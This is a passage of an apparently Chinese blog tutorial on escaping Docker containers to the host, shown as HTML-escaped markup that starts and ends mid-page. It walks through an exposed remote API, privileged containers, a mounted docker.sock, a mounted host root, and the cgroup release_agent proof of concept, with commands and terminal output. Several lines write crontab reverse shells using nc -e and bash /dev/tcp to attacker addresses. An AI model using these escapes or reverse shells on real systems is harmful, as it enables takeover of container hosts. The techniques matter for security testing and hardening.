&amp;lt;docker_host&amp;gt;:PORT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;Detach&amp;quot;: false,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;Tty&amp;quot;: false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果要逃逸到宿主机，利用方法是，我们随意启动一个容器，并将宿主机的 &lt;code&gt;/etc&lt;/code&gt;  目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client = docker.DockerClient(base_url=&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://your-ip:2375/&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = client.containers.run(&lt;span class=&#34;string&#34;&gt;&amp;#x27;alpine:latest&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;r&amp;#x27;&amp;#x27;&amp;#x27;sh -c &amp;quot;echo &amp;#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&amp;#x27; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;quot; &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;, remove=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, volumes=&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/etc&amp;#x27;&lt;/span&gt;: &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;bind&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;/tmp/etc&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;mode&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;rw&amp;#x27;&lt;/span&gt;&amp;#125;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2docker-特权逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2docker-特权逃逸&#34;&gt;#&lt;/a&gt; 2.docker 特权逃逸&lt;/h3&gt;
&lt;p&gt;1. 启动特权容器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run -it --privileged ubuntu:18.04  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@f445bbcea9dd:/# id &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 挂载宿主目录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fdisk -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@f445bbcea9dd:/# fdisk -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disk /dev/vda: 50 GiB, 53687091200 bytes, 104857600 sectors&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Units: sectors of 1 * 512 = 512 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sector size (logical/physical): 512 bytes / 512 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;I/O size (minimum/optimal): 512 bytes / 512 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disklabel type: dos&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disk identifier: 0x0009ac89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Device     Boot Start       End   Sectors Size Id Type&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/vda1  *     2048 104857566 104855519  50G 83 Linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@f445bbcea9dd:/# mkdir /uzju&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@f445bbcea9dd:/# mount /dev/vda1 /uzju/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@f445bbcea9dd:/# chroot /uzju/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh-4.2# ls &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1.sh	  CronText    c-jwt-cracker  clash	    docker-file  haha.py	msfinstall  vendor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Arjun	  DS_Store    check.py	     composer.json  etcbackup	 install.sh	plus.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh-4.2# cat /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;guest:x:0:0:guest:/home/guest:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin:x:1:1:bin:/bin:/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3挂载dockersock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3挂载dockersock&#34;&gt;#&lt;/a&gt; 3. 挂载 docker.sock&lt;/h3&gt;
&lt;p&gt;/var/run/docker.sock 是 Docker 守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与 Docker 守护进程通信的工具 Unix Sockets 术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。&lt;/p&gt;
&lt;p&gt;另一种类型的 Socket 是 Unix Socket，这些套接字用于 IPC（进程间通信）。它们也称为 Unix 域套接字 (UDS)。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。&lt;/p&gt;
&lt;p&gt;Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd. 默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1、unix:///var/run/docker.sock&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2、tcp://host:port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3、fd://socketfd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中使用 docker.sock 进行通信为默认方式，当容器中进程需在生产过程中与 Docker 守护进程通信时，容器本身需要挂载 /var/run/docker.sock 文件。&lt;br&gt;
本质上而言，能够访问 docker socket 或连接 HTTPS API 的进程可以执行 Docker 服务能够运行的任意命令，以 root 权限运行的 Docker 服务通常可以访问整个主机系统。&lt;br&gt;
因此，当容器访问 docker socket 时，我们可通过与 docker daemon 的通信对其进行恶意操纵完成逃逸。若容器 A 可以访问 docker socket，我们便可在其内部安装 client（docker），通过 docker.sock 与宿主机的 server（docker daemon）进行交互，运行并切换至不安全的容器 B，最终在容器 B 中控制宿主机。&lt;/p&gt;
&lt;p&gt;创建 docker, 挂载 /var/run/ 的容器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@381fa7cedc40:/var/run# ls -al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;total 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 1 root root 4096 Nov 28 02:08 .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 1 root root 4096 Nov 28 02:17 ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srw-rw---- 1 root  992    0 Apr 17  2022 docker.sock&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxrwxrwt 2 root root 4096 Sep 30  2021 lock&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 4096 Sep 30  2021 mount&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x 2 root root 4096 Sep 30  2021 systemd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-rw-r-- 1 root utmp    0 Sep 30  2021 utmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看宿主机 docker 信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker -H unix:///host/var/run/docker.sock info&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行一个新容器并挂载宿主机根路径&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:18.04 /bin/bash &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chroot /aa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在新容器 /aa 路径下完成对宿主机资源的访问&lt;/p&gt;
&lt;p&gt;写入计划任务文件，反弹 shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/9988 0&amp;gt;&amp;amp;1&amp;#x27; &amp;gt;&amp;gt; /nuoyan/var/spool/cron/root &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4挂载宿主机根目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4挂载宿主机根目录&#34;&gt;#&lt;/a&gt; 4. 挂载宿主机根目录&lt;/h3&gt;
&lt;p&gt;如果在 docker 启动的时候挂载了宿主机的根目录，就可以通过 chroot 获取宿主机的权限&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run -it -v /:/uzju/ ubuntu:18.04 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chroot /uzju/  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sh-4.2# ls &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1.sh	  CronText    c-jwt-cracker  clash	    docker-file  haha.py	msfinstall  vendor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Arjun	  DS_Store    check.py	     composer.json  etcbackup	 install.sh	plus.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反弹 shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;* * * * * /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.139/ &amp;gt;&amp;amp;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5-cgroup执行宿主机系统命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-cgroup执行宿主机系统命令&#34;&gt;#&lt;/a&gt; 5、Cgroup 执行宿主机系统命令&lt;/h3&gt;
&lt;p&gt;通过 notify_on_release 实现容器逃逸条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以 root 用户身份在容器内运行&lt;/li&gt;
&lt;li&gt;使用 SYS_ADMINLinux 功能运行&lt;/li&gt;
&lt;li&gt;缺少 AppArmor 配置文件，否则将允许 mountsyscall&lt;/li&gt;
&lt;li&gt;cgroup v1 虚拟文件系统必须以读写方式安装在容器内&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;POC&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# In the container &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;host_path=`sed -n &amp;#x27;s/.*\perdir=\([^,]*\).*/\1/p&amp;#x27; /etc/mtab` &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;$host_path/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 写入自定义命令 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;#!/bin/sh&amp;#x27; &amp;gt; /cmd &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 结果在当前目录的output文件中 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;ls -al /root &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod a+x /cmd &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;cat output&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@6c9a389c4fa2:/# cat output &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;total 44688&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dr-xr-x---. 24 root       root           4096 Nov 27 11:01 .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dr-xr-xr-x. 24 root       root           4096 Nov 28 10:44 ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rwxrwxrwx   1 root       root           1460 Apr  4  2022 1.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x   3 root       root           4096 May 16  2022 Arjun&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x   5 root       root           4096 Oct 31 14:19 CS4.4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root         320279 Nov 27 11:00 Cron.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root       44937808 Nov 28 10:40 CronText&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root           8196 May 29  2022 DS_Store&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root            284 Sep  4 12:27 Dockerfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x   3 root       root           4096 Sep  4 22:50 book&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x   3 root       root           4096 May  6  2022 c-jwt-cracker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root          18856 Dec 28  2021 check.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   1 root       root          16999 Dec 28  2021 